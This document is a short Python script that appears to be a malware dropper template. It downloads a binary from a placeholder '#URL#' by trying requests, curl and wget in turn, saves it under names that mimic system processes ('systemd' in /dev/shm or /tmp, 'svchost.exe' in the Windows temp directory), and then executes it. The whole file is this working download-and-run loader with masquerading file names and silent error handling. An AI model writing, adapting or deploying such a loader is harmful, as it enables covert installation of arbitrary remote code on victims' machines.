from os import path, chmod, execvp
from subprocess import run, Popen
from platform import system
from shutil import which
import stat

URL = "#URL#"

def get_name() -> str:
    return "systemd" if system() == "Linux" else "svchost.exe"

def get_path() -> str:
    if system() == "Linux" and path.exists("/dev/shm"):
        return "/dev/shm/systemd"
    elif system() == "Linux":
        return "/tmp/systemd"
    from tempfile import gettempdir
    return path.join(gettempdir(), "svchost.exe")

def download_requests() -> bool:
    res = req.get(URL)
    with open(get_path(), "wb") as f:
        f.write(res.content)
    return True

def download_curl():
    curl = which("curl")
    if curl == None:
        curl = which("curl.exe")
    if curl == None:
        return False

    target = get_path()
    run([curl, "-o", target, URL], stdout=None, stderr=None, stdin=None, close_fds=True)
    return path.exists(target) 

def download_wget():
    wget = which("wget")
    if wget == None:
        wget = which("wget.exe")
    if wget == None:
        return False

    target = get_path()
    run([wget, "-O", target, URL], stdout=None, stderr=None, stdin=None, close_fds=True)
    return path.exists(target) 

ret = False

try:
    import requests as req
    ret = download_requests()
except:
    pass

if not ret:
    try:
        ret = download_curl()
    except:
        pass

if not ret:
    try:
        ret = download_wget()
    except:
        pass

if not ret:
    exit(1)

p = get_path()
if system() == "Linux":
    chmod(p, stat.S_IRUSR | stat.S_IWUSR | stat.S_IXUSR)
    execvp(p, [p])
else:
    Popen([p], stdin=None, stdout=None, stderr=None, close_fds=True)
